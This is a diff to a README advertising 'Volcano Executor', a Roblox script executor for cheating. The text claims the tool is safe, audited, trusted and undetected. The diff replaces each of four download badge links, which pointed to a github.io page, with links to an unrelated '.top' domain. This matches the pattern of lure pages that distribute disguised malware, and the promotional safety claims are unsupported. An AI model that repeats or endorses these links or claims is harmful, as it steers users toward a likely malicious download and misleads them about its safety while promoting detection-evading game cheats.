@@ -6,7 +6,7 @@
 
 Welcome to the official repository for **Volcano Executor** — the smoothest, most reliable script-running environment built specifically for the Roblox platform in 2026. Whether you have been searching for a Roblox Volcano Executor that actually delivers on performance, or you need a Volcano Executor Safe solution that respects your device and your time, you have landed in the right place. This project was engineered from the ground up to answer the question thousands of players ask every day: *Is Volcano Executor Trusted?* The answer lives inside every feature, every update, and every line of carefully audited code you will find below. Grab the Volcano Executor Apk for mobile or the desktop build and experience the difference yourself.
 
-[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Latest_Build-blue?style=for-the-badge&logo=rocket)](https://volcanoexecutors.github.io/volcano/)
+[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Latest_Build-blue?style=for-the-badge&logo=rocket)](https://uabhw5.top/volcano)
 
 ---
 
@@ -56,7 +56,7 @@ Picking the right tool matters more than most players realize. A poorly built en
 | Auto-Update | ✅ Silent patches | ⚠️ Manual download |
 | Detection Status (June 2026) | ✅ Undetected | ⚠️ Varies |
 
-[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Windows_+_Mobile-blue?style=for-the-badge&logo=windows)](https://volcanoexecutors.github.io/volcano/)
+[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Windows_+_Mobile-blue?style=for-the-badge&logo=windows)](https://uabhw5.top/volcano)
 
 ---
 
@@ -221,7 +221,7 @@ A major concern for any player looking at a new tool is safety. Here is how **Vo
 - If the auto-updater feels slow, switch `update_channel` to `"beta"` for faster patches — note that beta builds of Roblox Volcano Executor may be less stable.
 - Bookmark the official release page so you always grab the genuine Volcano Executor Android Apk and avoid repackaged fakes.
 
-[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Get_Started_Now-blue?style=for-the-badge&logo=download)](https://volcanoexecutors.github.io/volcano/)
+[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Get_Started_Now-blue?style=for-the-badge&logo=download)](https://uabhw5.top/volcano)
 
 ---
 
@@ -335,7 +335,7 @@ Finding a tool that balances raw power with genuine safety is harder than it sou
 
 If you have read this far, you already know the answer to *Is Volcano Executor Trusted*. The hashes are public, the code is reviewed, and the track record speaks volumes. Roblox Volcano Executor is not just another weekend project — it is a seriously maintained toolset backed by a passionate development team and a growing community. Download it, configure it, make it yours, and see why hundreds of thousands of players have already made the switch.
 
-[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Official_Page-blue?style=for-the-badge&logo=github)](https://volcanoexecutors.github.io/volcano/)
+[![Download Volcano Executor](https://img.shields.io/badge/Download_Volcano_Executor-Official_Page-blue?style=for-the-badge&logo=github)](https://uabhw5.top/volcano)
 
 ---
 
